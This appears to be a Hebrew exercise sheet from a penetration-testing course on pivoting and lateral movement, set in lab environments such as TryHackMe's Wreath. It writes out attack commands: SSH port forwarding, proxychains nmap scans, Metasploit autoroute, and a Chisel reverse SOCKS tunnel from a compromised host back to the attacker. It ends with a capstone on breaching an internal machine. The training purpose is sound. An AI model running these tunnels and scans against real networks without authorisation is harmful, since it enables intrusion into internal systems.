<div dir="rtl">

# 🎯 תרגילים — מודול 12: Pivoting ותנועה רוחבית

> ⚠️ **רק על סביבות מעבדה חוקיות** — רשת מעבדה משלך, חדרי [TryHackMe](https://tryhackme.com) (Wreath, Pivoting), או HackTheBox Pro Labs. פתרונות ב-[**`solutions.md`**](solutions.md).

> ### 🚦 לפני שמתחילים — קרא אותי!
> - **מה צריך:** **Kali** + מכונת **Pivot** שכבר פרצת אליה, שיש לה גישה ל**רשת פנימית** נוספת. חדר **"Wreath"** ב-TryHackMe הוא המושלם לתרגול Pivoting מלא.
> - **איך עובדים:** קרא קודם את ה-[`README.md`](README.md) — טבלת השיטות בסוף היא סיכום זהב. למשימות עם פקודה ברורה — **הפקודה מופיעה**; לקשות **💡 רמז** ו-**✅ קריטריון**.
> - **נתקעת?** nmap לא עובד דרך proxychains? כמעט תמיד חסרים `-sT` ו-`-Pn`. נסה, ואז הצץ ב-[`solutions.md`](solutions.md).
> - **טיפ:** צייר תמיד את מפת הרשת (מי רואה את מי) — זה מבהיר את כל ה-Pivoting.

מקרא רמות: 🟢 קל · 🟡 בינוני · 🟠 מתקדם · 🔴 אתגר

---

## חלק א' — זיהוי והבנה (🟢)

**12.1** — הסבר את ההבדל בין **Pivoting**, **Lateral Movement** ו-**Tunneling**.
  💡 רמז: README §12.1.
  ✅ הצלחה: שלוש הגדרות ברורות במילים שלך.

**12.2** 🟢 — נפרצת למכונה. גלה אם יש לה **רשת פנימית נוספת**.
```bash
ip a          # ממשקים נוספים (eth1?)
ip route      # רשתות מנותבות
arp -a        # שכנים ידועים
```
  👀 **חפש:** ממשק שני (למשל `eth1` עם `10.10.10.x`) — זו רשת פנימית שאתה לא רואה מ-Kali.
  ✅ הצלחה: זיהית רשת פנימית שנגישה מה-Pivot בלבד.

**12.3** — צייר/תאר תרחיש Dual-Homed: Kali, Pivot (שתי רשתות), ומכונה פנימית. סמן מי רואה את מי.
  💡 רמז: README §12.2 (הדיאגרמה).
  ✅ הצלחה: הדיאגרמה מראה ש-Kali לא רואה את הרשת הפנימית ישירות.

---

## חלק ב' — SSH Tunneling (🟡)

**12.4** 🟡 — **Local Forwarding:** גש לשרת web פנימי דרך localhost.
```bash
ssh -L 8080:10.10.10.30:80 user@<pivot-ip>
# ב-Kali:
curl http://localhost:8080
```
  👀 **חפש:** `curl` מחזיר את תוכן השרת הפנימי (10.10.10.30) דרך הפורט המקומי 8080.
  ✅ הצלחה: הגעת לשירות פנימי דרך מנהרה.

**12.5** 🟡 — **Dynamic Forwarding:** הקם SOCKS proxy ו-proxychains.
```bash
ssh -D 9050 user@<pivot-ip>
# ערוך /etc/proxychains4.conf → הוסף בסוף:  socks5 127.0.0.1 9050
proxychains firefox http://10.10.10.30
```
  ✅ הצלחה: גלשת לשרת פנימי דרך ה-SOCKS proxy.

**12.6** 🟡 — הרץ **nmap דרך proxychains** על מכונה פנימית.
```bash
proxychains nmap -sT -Pn 10.10.10.30
```
  💡 רמז: README §12.4. `-sT` (לא SYN — לא עובר ב-SOCKS) ו-`-Pn` (ICMP לא עובר בפרוקסי) — **חובה**.
  ✅ הצלחה: קיבלת תוצאות סריקה של מכונה פנימית.

---

## חלק ג' — Metasploit ו-Chisel (🟠)

**12.7** 🟠 — יש לך Meterpreter על Pivot. הוסף **autoroute** וסרוק מכונה פנימית.
```bash
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > background
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 10.10.10.30
msf > run
```
  ✅ הצלחה: מודול Metasploit "רואה" וסורק את הרשת הפנימית.

**12.8** 🟠 — אין SSH. השתמש ב-**Chisel** (reverse SOCKS) והרץ scan דרכו.
  💡 רמז: README §12.6. ב-Kali: `chisel server -p 8000 --reverse`; על הקורבן: `chisel client <kali>:8000 R:socks`.
  ✅ הצלחה: הקמת מנהרת Chisel והרצת proxychains דרכה.

**12.9** 🟠 — הסבר מהו **Double Pivot** ומתי תזדקק לו.
  💡 רמז: README §12.7.
  ✅ הצלחה: הסברת שרשור מנהרות דרך מכונה פנימית לרשת עמוקה יותר.

---

## 🔴 אתגר מסכם — "חדירה לרשת הפנימית"

בסביבת מעבדה מרובת-רשתות (TryHackMe "Wreath" מצוין):

1. פרוץ את מכונת ה-Pivot (החשופה).
2. גלה את **הרשת הפנימית** מאחוריה.
3. הקם **מנהרה** (SSH -D / Chisel / Metasploit) לרשת הפנימית.
4. **סרוק** את הרשת הפנימית דרך המנהרה, מצא מכונה נוספת, ופרוץ אותה.
5. **תעד:** דיאגרמת רשת, שיטת ה-Pivot, והפקודות בכל שלב.

  💡 רמז: פתרון מלא + מבנה תיעוד ב-[`solutions.md`](solutions.md).
  ✅ הצלחה: חצית מהרשת החשופה לרשת פנימית ופרצת מכונה שם.

> 📤 חדירה לרשת פנימית דרך Pivot היא לב הבחינה של PNPT ו-OSCP. תעד את הדיאגרמה.

---

## ✅ רשימת בקרה — לפני מעבר למודול 13
- [ ] אני מבין Pivoting / Lateral Movement / Tunneling
- [ ] אני מזהה רשת פנימית אחרי פריצה
- [ ] אני משתמש ב-SSH -L / -R / -D
- [ ] אני מגדיר proxychains ומריץ דרכו כלים (עם -sT -Pn)
- [ ] אני מפייבוט עם Metasploit autoroute
- [ ] אני מקים מנהרה עם Chisel כשאין SSH
- [ ] אני מבין ומבצע Double Pivot

*פתרונות מלאים: [`solutions.md`](solutions.md)*

</div>
